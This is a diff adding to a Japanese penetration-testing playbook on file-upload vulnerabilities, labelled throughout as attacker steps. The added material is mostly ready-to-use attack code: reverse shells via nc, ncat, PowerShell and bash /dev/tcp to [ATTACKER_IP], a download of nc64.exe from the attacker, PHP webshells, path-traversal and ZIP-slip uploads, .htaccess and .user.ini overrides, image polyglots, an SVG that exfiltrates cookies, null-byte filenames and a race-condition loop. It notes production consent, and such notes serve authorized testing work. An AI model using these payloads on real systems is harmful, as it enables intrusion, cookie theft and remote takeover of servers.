@@ -121,16 +121,144 @@ python3 -m http.server 80
 # URL エンコードが必要（ブラウザで開く場合は不要）
 curl "http://[TARGET]/upload/test.php?cmd=powershell+Invoke-WebRequest+-Uri+http://[ATTACKER_IP]/nc64.exe+-OutFile+c:\users\public\nc.exe"
 
-# リバースシェルを実行
+# リバースシェルを実行（nc64.exe が `-e` 対応ビルドである前提）
 curl "http://[TARGET]/upload/test.php?cmd=c:\users\public\nc.exe+[ATTACKER_IP]+4444+-e+cmd.exe"
 ```
+
+> **`nc.exe -e` のビルド前提:** **純正 GNU netcat の Windows ビルドには `-e` オプションが含まれていない**ことが多く、`unknown option -e` で落ちる。`-e` を使うなら **(a) Nmap 同梱の `ncat.exe`**（Nmap インストールで一緒に入る・`-e` 対応）、または **(b) "gaping security hole" 版 `nc.exe`**（古典的に `-e` 含むビルド・GitHub の `int0x33/nc.exe` 等）を上げる。判別がつかない場合は安全側で `ncat.exe` を使う：
+> ```bash
+> curl "http://[TARGET]/upload/test.php?cmd=c:\users\public\ncat.exe+[ATTACKER_IP]+4444+-e+cmd.exe"
+> # または PowerShell 経由でリバースシェル（nc 不要）
+> curl "http://[TARGET]/upload/test.php?cmd=powershell+-c+%22%24c%3Dnew-object+system.net.sockets.tcpclient%28%27[ATTACKER_IP]%27%2C4444%29%3B...%22"
+> ```
 
 ターゲットが Linux の場合：
 
 ```bash
 # [Attacker] bash リバースシェルを URL エンコードして実行
-curl "http://[TARGET]/upload/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/[ATTACKER_IP]/4444+0>%261'"
+# シングルクォート `'` も `%27` で統一しておくと URL パーサ差での事故を防げる
+curl "http://[TARGET]/upload/shell.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/[ATTACKER_IP]/4444+0%3E%261%27"
 ```
+
+## 代表的なバイパス・派生攻撃
+
+直球の `shell.php` アップロードが弾かれた / 拡張子チェックが堅い環境向けの典型回避経路。
+
+### filename パラメータでのパストラバーサル
+
+multipart の `filename=` フィールドにパストラバーサルを混ぜると、サーバ側で `dirname/basename` のみ切り出していない実装で **指定先に直接書き込めることがある**。アップロードディレクトリが非公開（実行不可）でも、これで公開ディレクトリに `.php` を置けば実行に持ち込める。
+
+```bash
+# [Attacker] filename にパストラバーサルを仕込む
+curl -F 'file=@shell.php;filename=../../../var/www/html/shell.php' http://[TARGET]/upload
+
+# 試す保存先候補:
+#   ../../../var/www/html/shell.php           # Apache / Nginx 公開ルート
+#   ../../public/uploads/shell.php            # Web 公開直下
+#   ../templates/shell.php                    # CMS のテンプレート（読込時に実行されるケース）
+#   /var/www/html/.htaccess                   # .htaccess 直接上書き（下記）
+```
+
+### `.htaccess` / `.user.ini` 自体のアップロード
+
+拡張子ブラックリストが堅くて `.php` / `.phtml` / `.php5` 等が全て弾かれる環境では、**サーバ設定ファイル自体を上げて画像ディレクトリで PHP 実行を許可させる**経路がある。
+
+```apache
+# [Attacker] .htaccess を upload/ に置いて画像ディレクトリでも PHP 実行されるようにする
+AddType application/x-httpd-php .png .jpg .gif
+# その後 shell.png（中身は PHP）をアップロードして /upload/shell.png にアクセス → PHP として実行
+```
+
+```ini
+; [Attacker] .user.ini （PHP 5.3+ で動く）— ファイル名チェックが .htaccess を弾く環境向け
+; アップロードディレクトリに置くと同ディレクトリの PHP の初期化値を変える
+; 例: auto_prepend_file で別の PHP を強制 include
+auto_prepend_file = "shell.png"
+```
+
+```bash
+# [Attacker] それぞれをアップロード
+curl -F 'file=@.htaccess;filename=.htaccess' http://[TARGET]/upload
+curl -F 'file=@.user.ini;filename=.user.ini' http://[TARGET]/upload
+curl -F 'file=@shell.png' http://[TARGET]/upload
+# その後 /upload/shell.png にアクセス
+```
+
+### ポリグロット（画像 + スクリプト）
+
+Content-Type / マジックバイト判定（`getimagesize()` 等）を通過させるために、画像として valid な先頭 + スクリプト本体を連結する。
+
+```bash
+# [Attacker] GIF マジックバイト + PHP
+printf 'GIF89a;\n<?php system($_GET["cmd"]); ?>\n' > shell.gif
+# getimagesize() は GIF として認識・ファイル拡張子が .php / .phtml で保存されれば PHP として実行
+
+# [Attacker] 実存 PNG ファイル末尾に PHP を追記
+cp legit.png poly.png
+echo '<?php system($_GET["cmd"]); ?>' >> poly.png
+# 画像表示も生き残るパターン
+```
+
+### SVG 内 JavaScript（保存型 XSS への昇格）
+
+SVG は XML で、`<script>` タグや `onload` 属性を持てる。**画像扱いで受け入れられがちなのに XSS のキャリアになる。**
+
+```xml
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://[ATTACKER_HTTP_SERVER]/c?'+document.cookie)">
+  <script type="text/javascript">
+    alert(document.domain);
+    // 攻撃者サーバへ送信
+    fetch('http://[ATTACKER_HTTP_SERVER]/c?'+document.cookie);
+  </script>
+</svg>
+```
+
+> アップロード後の URL が `<img src="...">` ではなく **直接ブラウザで表示される経路**（プレビュー / ダウンロード時に Content-Type が `image/svg+xml`）なら XSS 成立。詳細は `XSS.md`。
+
+### ZIP slip（アーカイブ展開系アップロード）
+
+ZIP / TAR / RAR を受け取って展開するアップローダで、エントリ名に `../` を含めると **展開先の外**に書き出せる。
+
+```bash
+# [Attacker] ZIP slip ペイロード
+mkdir -p tmpzip && cd tmpzip
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+# zip エントリ名にパストラバーサルを仕込む（python の zipfile で生 ZIP を組み立てる）
+python3 -c "
+import zipfile
+with zipfile.ZipFile('../slip.zip', 'w') as z:
+    z.writestr('../../../var/www/html/shell.php', open('shell.php').read())
+"
+# slip.zip をアップロード → サーバ側展開で /var/www/html/shell.php が出現
+```
+
+### Null byte 埋め込み（古い PHP / 古いライブラリ向け）
+
+PHP 5.3.x 以下や CGI 経由で動く古い実装では、ファイル名中の `%00`（NULL）が C 文字列の終端として扱われ、**`shell.php%00.png` を `shell.php` として保存しつつ拡張子チェックは `.png` を見る**実装ミスが成立する。
+
+```bash
+# [Attacker] null byte 埋め込み（古い PHP / 古いライブラリ向け）
+curl -F 'file=@shell.php;filename=shell.php%00.png' http://[TARGET]/upload
+# 現代環境ではほぼ閉じているが、レガシ環境では現役の手
+```
+
+### TOCTOU レース（リネーム前にアクセス）
+
+アップロード処理が「(1) 受信 → (2) 一時パスに保存 → (3) 検証 → (4) 拒否なら削除 / 受理なら最終パスへリネーム」の流れの場合、**(2) と (4) の間に攻撃者がアクセスできる**経路があれば、検証で拒否される予定のファイルでも実行できる。
+
+```bash
+# [Attacker] アップロードと並行に大量リクエストを撃つ
+( curl -F 'file=@shell.php' http://[TARGET]/upload & ) ;
+for i in $(seq 1 10000); do
+  curl -s "http://[TARGET]/tmp/[PREDICTABLE_TEMP_NAME]?cmd=id" &
+done; wait
+```
+
+> 一時ファイル名が予測可能（タイムスタンプ・連番）+ 一時保存パスが Web 公開ディレクトリ配下 + 検証に時間がかかる、の 3 条件が揃うと刺さる。
+
+---
 
 ## PoC の信頼性確認と事前検証
 
@@ -194,10 +322,10 @@ unzip [zip_file]
 
 > **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
 > - [x] 不可逆な変更を含む（アップロードファイルが残存する）
-> - [ ] 業務停止リスク（サービス・認証）
+> - [x] 業務停止リスク（サービス・認証）— `.htaccess` / `.user.ini` の上書きは同ディレクトリの他ファイルの挙動を変える / Web シェル放置で他攻撃者からのピボット起点になる
 > - [ ] 持続化に該当
 > - [ ] SIEM/EDR で確実に検知される
-> 実施可否は事前合意で明示確認すること。
+> 実施可否は事前合意で明示確認すること。**`.htaccess` / `.user.ini` を書き換えた場合は原状回復必須**（元の内容を保存してから書き換える）。
 
 ## 本番での前提
 
